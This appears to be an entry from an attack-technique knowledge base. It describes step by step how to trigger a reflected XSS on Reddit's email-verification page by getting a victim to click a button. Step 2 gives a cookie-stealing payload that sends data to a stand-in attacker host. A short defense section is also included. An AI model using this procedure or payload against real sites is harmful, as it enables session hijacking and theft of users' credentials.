---
id: proc-reddit-xss-trigger-001
tags:
  - xss-execution
  - session-theft
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Credentials from Web Browsers]]'
updated_at: '2025-12-13T23:56:04.004Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Credentials from Web Browsers]]'
---
# Trigger-XSS-Payload-via-Button-Click

## Summary

This procedure triggers the execution of an injected JavaScript payload in Reddit's email verification interstitial page by simulating user interaction with the 'Verify Email' button, leading to arbitrary code execution in the browser.

## Description

Following the delivery of a malicious URL to the /verification endpoint, the unsanitized token is reflected into the page HTML. Clicking the verification button processes and renders this content, executing the XSS payload. This allows theft of cookies, session hijacking, phishing redirects, malware injection, or HTML modification. The attack relies on victim interaction and occurs in the browser context of a legitimate Reddit user.

## Requirements

1. Victim has accessed the malicious verification URL
2. Browser with JavaScript enabled
3. No additional tools needed beyond standard user interaction

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all reflected inputs before rendering
- Implement client-side validation and CSP headers to block unsafe scripts
- Log and alert on suspicious button interactions or script executions in verification flows

## Objectives

1. Execute injected JavaScript in the victim's browser
2. Exfiltrate sensitive data like cookies and sessions
3. Enable follow-on attacks such as phishing or page defacement

## Instructions

### Step 1: Load the Interstitial Page

**Context**: Ensure the malicious URL has been accessed, loading the Reddit verification page with the reflected payload in the HTML source.

Inspect the page source to confirm the token string includes the injected payload without execution yet.

### Step 2: Interact with the Button

**Context**: Simulate or guide the victim to click the 'Verify Email' button, triggering the endpoint's response that renders the unsanitized content.

The click event processes the token, injecting and executing the JavaScript, e.g., `alert(document.location)` or `fetch('https://attacker.com?data='+document.cookie)`.

### Step 3: Verify Execution

**Context**: Monitor for signs of successful payload run, such as alerts, redirects, or data exfiltration to attacker-controlled server.

Check network logs or attacker server for received stolen data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript
- [[Credentials from Web Browsers]] Credentials from Web Browsers

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-execution]]
- [[session-theft]]
